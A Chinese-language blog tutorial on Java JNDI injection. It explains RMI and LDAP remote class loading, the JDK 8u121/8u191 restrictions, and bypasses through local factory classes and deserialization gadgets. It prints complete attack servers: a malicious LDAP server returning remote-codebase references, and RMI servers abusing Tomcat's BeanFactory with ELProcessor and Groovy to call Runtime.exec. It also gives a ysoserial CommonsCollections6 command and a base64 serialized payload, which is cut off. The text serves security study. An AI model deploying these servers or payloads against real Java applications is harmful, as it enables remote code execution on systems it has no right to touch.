<p>我们创建了一个javax.naming.Reference的示例，把这个示例绑定到”&#x2F;RCE“地址上，这个Export对象对目标服务器会从”<a target="_blank" rel="noopener" href="http://127.0.0.1:8081/Calculator.class%E2%80%9C%E8%BF%99%E9%87%8C%E8%8E%B7%E5%8F%96%E5%AD%97%E8%8A%82%E7%A0%81%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%A7%A6%E5%8F%911%E4%B8%AARCE%E3%80%82">http://127.0.0.1:8081/Calculator.class“这里获取字节码，从而触发1个RCE。</a></p>
<p>上面的代码在Java 8u121 Oracle添加RMI代码限制的前工作完美。之后，我们可以利用一个恶意的LDAP服务器响应相同信息，进行攻击。 </p>
<p>Java 8u121 Oracle添加的限制和Codebase机制有关。Codebase指定了Java程序在网络上远程加载类的路径。RMI机制中交互的数据是序列化形式传输的，但是传输的只是对象的数据内容，RMI本身并不会传递类的代码。当本地没有该对象的类定义时，RMI提供了一些方法可以远程加载类，也就是RMI动态加载类的特性。</p>
<p>当RMI对象发送序列化数据时，会在序列化流中附加上Codebase的信息，这个信息告诉接收方到什么地方寻找该对象的执行代码。</p>
<p>RMI客户端在 lookup() 的过程中，</p>
<ul>
<li>会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载</li>
<li>然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象。远程Codebase实际上是一个URL表，该URL上存放了接收方需要的类文件。</li>
</ul>
<p>当接收程序试图从该URL的Webserver上下载类文件时，它会把类的包名转化成目录，在Codebase 的对应目录下查询类文件，如果你传递的是类文件 com.project.test ，那么接受方就会到下面的URL去下载类文件： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url:8080/com/project/test.class</span><br></pre></td></tr></table></figure>

<p>但是，从Java 8u121 Oracle后，rmi的trustURLCodebase默认设置为false，将禁用自动加载远程类文件，仅从CLASSPATH和当前VM的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 </p>
<p>Changelog:</p>
<ul>
<li>JDK 6u45 <a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/relnotes.html</a></li>
<li>JDK 7u21 <a target="_blank" rel="noopener" href="http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">http://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018200126791-1636433909.png" alt="img"></p>
<p>具体被阻断在于步骤4，如下图。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019154443382-522642648.png" alt="img"></p>
<p>虽然rmi远程类加载默认被禁用了，但是在8u191之前，ldap的trustURLCodebase还是默认为true的。</p>
<p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP&#x2F;IP协议栈之上，基于C&#x2F;S架构。</p>
<p>Java对象在LDAP目录中也有多种存储形式：</p>
<ul>
<li>Java序列化</li>
<li>JNDI Reference</li>
<li>Marshalled对象</li>
<li>Remote Location（已弃用）</li>
</ul>
<p>LDAP可以为存储的Java对象指定多种属性：</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData</li>
<li>…</li>
</ul>
<p>这里 javaCodebase 属性可以指定远程的URL，这样黑客可以控制反序列化中的class，通过JNDI Reference的方式进行利用，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap:&#x2F;&#x2F;xxx&#x2F;xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8081/#Calculator&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231018201907663-70842967.png" alt="img"></p>
<p>不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p>
<p>这导致JNDI远程类加载问题被修复。自此也就意味着远程codebase的Reference方式被限制死了。</p>
<p>之后攻击者利用jndi注入主要是进行不信任数据的反序列化，利用门槛变高，要求系统中存在gadgetl类。 </p>
<h3 id="JAVA-8u191之后"><a href="#JAVA-8u191之后" class="headerlink" title="JAVA 8u191之后"></a>JAVA 8u191之后</h3><h4 id="1、找到一个受害者本地CLASSPATH中的类作为恶意的Reference-Factory工厂类，并利用这个本地的Factory类执行命令"><a href="#1、找到一个受害者本地CLASSPATH中的类作为恶意的Reference-Factory工厂类，并利用这个本地的Factory类执行命令" class="headerlink" title="1、找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令"></a>1、<strong>找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令</strong></h4><p>JAVA 8u191时，JNDI客户端在接受远程引用对象的时候，不使用classFactoryLoction，但是我们还是可以通过JavaFactory来指定一个任意的工厂类，这个类时用于从攻击者控制的Reference对象中提取真实的对象。</p>
<p>这个工厂类需要满足以下几个条件：</p>
<ul>
<li>真实对象要求必须存在目标系统的classpath</li>
<li>工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法</li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019092844413-1670754622.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019092904310-102043731.png" alt="img"></p>
<p>接下来的问题就是，我们需要找到一个工厂类在classpath中，它对Reference的属性做了一些不安全的动作。 </p>
<p>org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能，</p>
<ul>
<li>org.apache.naming.factory.BeanFactory 默认存在于Tomcat依赖包中，所以使用也是非常广泛</li>
<li>org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化Reference所指向的任意Bean Class，并且会调用setter方法为所有的属性赋值。而该Bean Class的类名、属性、属性值，全都来自于Reference对象，均是攻击者可控的</li>
</ul>
<p>配置<a target="_blank" rel="noopener" href="https://repo.huaweicloud.com/java/jdk/8u192-b12/">jdk 8b192</a>，</p>
<p>org.apache.naming.factory.BeanFactory#getObjectInstance中，包含了一段利用反射创建bean的代码。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019114655764-1496027449.png" alt="img"></p>
<p>这里利用BeanFactory工厂类加载ELProcessor类，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019114946318-125590148.png" alt="img"></p>
<p>取forceString的值，以等号逗号截取拿到键x和对应的method即ELProcessor的eval，并且填充了一个string类型的参数作为method的反射调用，最后通过method名和一个string的参数拿到eval函数。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019135408715-1940344374.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019142258457-2075295261.png" alt="img"></p>
<p>这里使用的魔性属性时“forceString”, 通过设置“x&#x3D;eval”，我们可以将x属性对应的setter设置成eval函数。</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019142840514-1925803182.png" alt="img"></p>
<p>同时，Javax.el.ELProcessor类，存在一个eval方法，接收一个字符串，该字符串将表示要执行的Java表达式语言模板。 </p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019142437654-2074501430.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019142524617-880069077.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019143040048-168351332.png" alt="img"></p>
<p>ELProcessor_rmi_server.java服务端代码如下，服务端是攻击者控制的服务器。 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ELProcessor_rmi_server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1098</span>);</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;)&quot;</span>));</span><br><span class="line">            <span class="comment">//触发点在resourceRef的getObjectInstance()方法中</span></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">            registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>BeanFactory 创建了一个任意bean类实例并执行了它所有的setter函数。这个任意bean类的名字、属性、属性值都来自于Reference对象，外部完全可控。基本上相当于一个任意类后门了。 </p>
<p>除了el表达式之外还有groovy也可以，原理一样，代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ELProcessor_rmi_server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1098</span>);</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">            registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>maven配置好grovvy的包依赖，</p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019140551258-467610470.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019141946068-914371937.png" alt="img"></p>
<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019142130347-1804583824.png" alt="img"></p>
<h4 id="2、从JNDI服务远程获取一个Java反序列化对象，利用反序列化Gadget完成命令执行"><a href="#2、从JNDI服务远程获取一个Java反序列化对象，利用反序列化Gadget完成命令执行" class="headerlink" title="2、从JNDI服务远程获取一个Java反序列化对象，利用反序列化Gadget完成命令执行"></a>2、从JNDI服务远程获取一个Java反序列化对象，<strong>利用反序列化Gadget完成命令执行</strong></h4><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。</p>
<p>其中具体的处理代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123; </span><br><span class="line">    ClassLoader cl = helper.getURLClassLoader(codebases);</span><br><span class="line">    return deserializeObject((byte[])attr.get(), cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019144247056-1736514377.png" alt="img"></p>
<p>我们假设目标系统中存在着有漏洞的CommonsCollections库，使用ysoserial生成一个CommonsCollections的利用Payload：</p>
<p>下载链接 ：<a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &#x27;/System/Applications/Calculator.app&#x27;|base64</span><br><span class="line"></span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACMvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcHQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwu